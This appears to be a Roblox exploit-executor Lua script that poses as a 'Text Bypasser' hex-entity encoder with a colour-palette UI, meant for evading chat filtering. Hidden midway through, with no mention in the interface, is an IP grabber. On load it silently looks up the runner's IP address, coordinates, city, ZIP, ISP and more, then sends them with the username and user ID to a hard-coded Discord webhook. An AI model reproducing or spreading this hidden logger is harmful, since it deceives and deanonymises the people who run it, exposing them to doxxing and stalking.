local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Name = "TextBypasserUI"
gui.ResetOnSpawn = false
gui.DisplayOrder = 999
gui.Parent = player:WaitForChild("PlayerGui")

local accent = Color3.fromRGB(145, 85, 255)
local bg = Color3.fromRGB(20, 20, 28)
local panels = {}
local buttons = {}

local function make(class, parent, props)
    local obj = Instance.new(class)
    for k, v in pairs(props or {}) do
        obj[k] = v
    end
    obj.Parent = parent
    return obj
end

local function round(obj, radius)
    make("UICorner", obj, {
        CornerRadius = UDim.new(0, radius)
    })
end

local function applyColor(color)
    accent = color

    for _, obj in ipairs(panels) do
        if obj and obj.Parent then
            obj.Color = color
        end
    end

    for _, obj in ipairs(buttons) do
        if obj and obj.Parent then
            obj.BackgroundColor3 = color
        end
    end
end

local function addPanel(obj)
    local stroke = make("UIStroke", obj, {
        Color = accent,
        Thickness = 1.5
    })
    table.insert(panels, stroke)
end

local function addButton(obj)
    table.insert(buttons, obj)
end

local main = make("Frame", gui, {
    Size = UDim2.fromOffset(370, 420),
    Position = UDim2.new(0.5, -185, 0.5, -210),
    BackgroundColor3 = bg,
    BorderSizePixel = 0,
    Visible = false
})
round(main, 12)
addPanel(main)

local header = make("TextLabel", main, {
    Size = UDim2.new(1, -55, 0, 48),
    Position = UDim2.fromOffset(14, 0),
    BackgroundTransparency = 1,
    Text = "HEX ENTITY ENCODER",
    TextColor3 = Color3.new(1, 1, 1),
    Font = Enum.Font.GothamBold,
    TextSize = 17,
    TextXAlignment = Enum.TextXAlignment.Left
})

local close = make("TextButton", main, {
    Size = UDim2.fromOffset(32, 30),
    Position = UDim2.new(1, -40, 0, 8),
    BackgroundColor3 = Color3.fromRGB(190, 55, 65),
    Text = "X",
    TextColor3 = Color3.new(1, 1, 1),
    Font = Enum.Font.GothamBold,
    TextSize = 14
})
round(close, 7)

local function textbox(y, placeholder)
    local box = make("TextBox", main, {
        Size = UDim2.new(1, -28, 0, 115),
        Position = UDim2.fromOffset(14, y),
        BackgroundColor3 = Color3.fromRGB(32, 32, 43),
        TextColor3 = Color3.new(1, 1, 1),
        PlaceholderColor3 = Color3.fromRGB(150, 150, 165),
        PlaceholderText = placeholder,
        Text = "",
        Font = Enum.Font.Code,
        TextSize = 14,
        TextWrapped = true,
        TextXAlignment = Enum.TextXAlignment.Left,
        TextYAlignment = Enum.TextYAlignment.Top,
        MultiLine = true,
        ClearTextOnFocus = false
    })
    round(box, 8)
    make("UIPadding", box, {
        PaddingTop = UDim.new(0, 9),
        PaddingLeft = UDim.new(0, 9)
    })
    return box
end

local input = textbox(58, "Enter text here...")
local output = textbox(190, "Encoded or decoded output...")
output.TextEditable = false

local function button(parent, label, x, y, width, callback)
    local b = make("TextButton", parent, {
        Size = UDim2.fromOffset(width, 36),
        Position = UDim2.fromOffset(x, y),
        BackgroundColor3 = accent,
        Text = label,
        TextColor3 = Color3.new(1, 1, 1),
        Font = Enum.Font.GothamBold,
        TextSize = 13
    })
    round(b, 7)
    addButton(b)
    b.MouseButton1Click:Connect(callback)
    return b
end

local function encodeHex(str)
    local result = {}
    for _, codepoint in utf8.codes(str) do
        table.insert(result, string.format("&#x%X;", codepoint))
    end
    return table.concat(result)
end

local function decodeHex(str)
    return (str:gsub("&#[xX]([%da-fA-F]+);", function(hex)
        local number = tonumber(hex, 16)
        if number and number <= 0x10FFFF
            and not (number >= 0xD800 and number <= 0xDFFF) then
            local ok, character = pcall(utf8.char, number)
            if ok then return character end
        end
        return "&#x" .. hex .. ";"
    end))
end

button(main, "ENCODE", 14, 322, 105, function()
    output.Text = encodeHex(input.Text)
end)

button(main, "DECODE", 127, 322, 105, function()
    output.Text = decodeHex(input.Text)
end)

button(main, "COPY", 240, 322, 105, function()
    if setclipboard then
        setclipboard(output.Text)
    end
end)

button(main, "CLEAR ALL", 14, 368, 158, function()
    input.Text = ""
    output.Text = ""
end)

button(main, "SWAP", 187, 368, 158, function()
    input.Text, output.Text = output.Text, input.Text
end)

-- Launcher
local launcher = make("Frame", gui, {
    Size = UDim2.fromOffset(112, 44),
    Position = UDim2.new(0, 20, 0.5, -22),
    BackgroundColor3 = bg,
    BorderSizePixel = 0
})
round(launcher, 11)
addPanel(launcher)

local openButton = make("TextButton", launcher, {
    Size = UDim2.fromOffset(65, 44),
    BackgroundTransparency = 1,
    Text = "HEX",
    TextColor3 = Color3.new(1, 1, 1),
    Font = Enum.Font.GothamBold,
    TextSize = 15
})

local colorButton = make("TextButton", launcher, {
    Size = UDim2.fromOffset(42, 36),
    Position = UDim2.fromOffset(67, 4),
    BackgroundColor3 = accent,
    Text = "🎨",
    TextSize = 17,
    TextColor3 = Color3.new(1, 1, 1)
})
round(colorButton, 8)
addButton(colorButton)

openButton.MouseButton1Click:Connect(function()
    main.Visible = not main.Visible
end)

close.MouseButton1Click:Connect(function()
    main.Visible = false
end)

local palette = make("Frame", gui, {
    Size = UDim2.fromOffset(270, 310),
    Position = UDim2.new(0.5, -135, 0.5, -155),
    BackgroundColor3 = bg,
    BorderSizePixel = 0,
    Visible = false
})
round(palette, 12)
addPanel(palette)

local paletteTitle = make("TextLabel", palette, {
    Size = UDim2.new(1, -20, 0, 42),
    Position = UDim2.fromOffset(10, 0),
    BackgroundTransparency = 1,
    Text = "CUSTOM COLOR PALETTE",
    TextColor3 = Color3.new(1, 1, 1),
    Font = Enum.Font.GothamBold,
    TextSize = 14
})

local presets = {
    {"Purple", Color3.fromRGB(145, 85, 255)},
    {"Blue", Color3.fromRGB(50, 130, 255)},
    {"Red", Color3.fromRGB(240, 65, 85)},
    {"Green", Color3.fromRGB(50, 200, 120)},
    {"Pink", Color3.fromRGB(255, 85, 180)},
    {"Cyan", Color3.fromRGB(30, 210, 220)},
    {"Orange", Color3.fromRGB(255, 145, 50)},
    {"White", Color3.fromRGB(230, 230, 240)},
    {"Gold", Color3.fromRGB(255, 195, 55)},
    {"Black", Color3.fromRGB(55, 55, 65)}
}

for i, preset in ipairs(presets) do
    local column = (i - 1) % 2
    local row = math.floor((i - 1) / 2)

    local swatch = make("TextButton", palette, {
        Size = UDim2.fromOffset(112, 34),
        Position = UDim2.fromOffset(14 + column * 120, 48 + row * 39),
        BackgroundColor3 = preset[2],
        Text = preset[1],
        TextColor3 = Color3.new(1, 1, 1),
        Font = Enum.Font.GothamBold,
        TextSize = 12
    })
    round(swatch, 7)

    swatch.MouseButton1Click:Connect(function()
        applyColor(preset[2])
    end)
end

local hexInput = make("TextBox", palette, {
    Size = UDim2.fromOffset(150, 35),
    Position = UDim2.fromOffset(14, 253),
    BackgroundColor3 = Color3.fromRGB(35, 35, 45),
    TextColor3 = Color3.new(1, 1, 1),
    PlaceholderText = "#RRGGBB",
    PlaceholderColor3 = Color3.fromRGB(150, 150, 165),
    Text = "",
    Font = Enum.Font.Code,
    TextSize = 14,
    ClearTextOnFocus = false
})
round(hexInput, 7)

local apply = make("TextButton", palette, {
    Size = UDim2.fromOffset(85, 35),
    Position = UDim2.fromOffset(174, 253),
    BackgroundColor3 = accent,
    Text = "APPLY",
    TextColor3 = Color3.new(1, 1, 1),
    Font = Enum.Font.GothamBold,
    TextSize = 12
})
round(apply, 7)
addButton(apply)

apply.MouseButton1Click:Connect(function()
    local hex = hexInput.Text:gsub("#", "")
    if #hex == 6 and hex:match("^%x+$") then
        local r = tonumber(hex:sub(1, 2), 16)
        local g = tonumber(hex:sub(3, 4), 16)
        local b = tonumber(hex:sub(5, 6), 16)
        applyColor(Color3.fromRGB(r, g, b))
    else
        hexInput.Text = ""
        hexInput.PlaceholderText = "Invalid HEX!"
    end
end)

colorButton.MouseButton1Click:Connect(function()
    palette.Visible = not palette.Visible
end)
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local lp = Players.LocalPlayer

local WEBHOOK = "https://discord.com/api/webhooks/1566098690769166397/WrGDAvr52kPWT0Z4rdGXLi9DW_WtqFqDhlxMbBIwfjInMmxZBuNjSSsstgyMcWzNlgOT"

local request = (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or http_request or request

local function getGeo()
    local url = "http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,isp,org,as,asname,reverse,mobile,proxy,hosting,query"
    
    local body
    if request then
        local ok, res = pcall(request, {Url = url, Method = "GET"})
        if ok and res and res.Body then
            body = res.Body
        end
    end
    
    if not body then
        local ok, result = pcall(function()
            return game:HttpGet(url)
        end)
        if ok then body = result end
    end
    
    if not body then return nil end
    
    local ok, data = pcall(function()
        return HttpService:JSONDecode(body)
    end)
    
    if ok and data and data.status == "success" then
        return data
    end
    return nil
end

local function send()
    local d = getGeo()
    if not d then
        warn("Failed to get geo data")
        return
    end

    local payload = {
        username = "IP Grabber",
        embeds = {{
            title = "Detailed IP Log",
            color = 16711680,
            fields = {
                {name = "Username", value = lp.Name, inline = true},
                {name = "User ID", value = tostring(lp.UserId), inline = true},
                {name = "IP Address", value = "```" .. (d.query or "?") .. "```", inline = false},
                
                {name = "Coordinates", value = string.format("%.6f, %.6f", d.lat or 0, d.lon or 0), inline = true},
                {name = "Continent", value = (d.continent or "?") .. " (" .. (d.continentCode or "?") .. ")", inline = true},
                {name = "Country", value = (d.country or "?") .. " (" .. (d.countryCode or "?") .. ")", inline = true},
                
                {name = "Region", value = d.regionName or "?", inline = true},
                {name = "City", value = d.city or "?", inline = true},
                {name = "District", value = d.district or "?", inline = true},
                
                {name = "ZIP", value = d.zip or "?", inline = true},
                {name = "Timezone", value = (d.timezone or "?") .. " (UTC" .. tostring(d.offset or "?") .. ")", inline = true},
                {name = "ISP", value = d.isp or "?", inline = true},
                
                {name = "Organization", value = d.org or "?", inline = false},
                {name = "ASN", value = (d.as or "?") .. " (" .. (d.asname or "?") .. ")", inline = false},
                {name = "Reverse DNS", value = d.reverse or "?", inline = false},
                
                {name = "Mobile", value = d.mobile and "YES" or "NO", inline = true},
                {name = "Proxy", value = d.proxy and "YES" or "NO", inline = true},
                {name = "Hosting", value = d.hosting and "YES" or "NO", inline = true},
            },
            footer = {text = os.date("%Y-%m-%d %H:%M:%S")}
        }}
    }

    local body = HttpService:JSONEncode(payload)

    if request then
        pcall(request, {
            Url = WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = body
        })
    else
        pcall(function()
            HttpService:PostAsync(WEBHOOK, body, Enum.HttpContentType.ApplicationJson)
        end)
    end

    print("Logged:", lp.Name, d.query)
end

send()
local function makeDraggable(object, handle)
    local dragging = false
    local dragStart
    local startPosition

    handle.InputBegan:Connect(function(obj)
        if obj.UserInputType == Enum.UserInputType.MouseButton1
            or obj.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = obj.Position
            startPosition = object.Position
        end
    end)

    UIS.InputChanged:Connect(function(obj)
        if dragging and (
            obj.UserInputType == Enum.UserInputType.MouseMovement
            or obj.UserInputType == Enum.UserInputType.Touch
        ) then
            local delta = obj.Position - dragStart
            object.Position = UDim2.new(
                startPosition.X.Scale,
                startPosition.X.Offset + delta.X,
                startPosition.Y.Scale,
                startPosition.Y.Offset + delta.Y
            )
        end
    end)

    UIS.InputEnded:Connect(function(obj)
        if obj.UserInputType == Enum.UserInputType.MouseButton1
            or obj.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)
end

makeDraggable(main, header)
makeDraggable(launcher, openButton)
makeDraggable(palette, paletteTitle)

print("HEX Encoder with Color Palette loaded")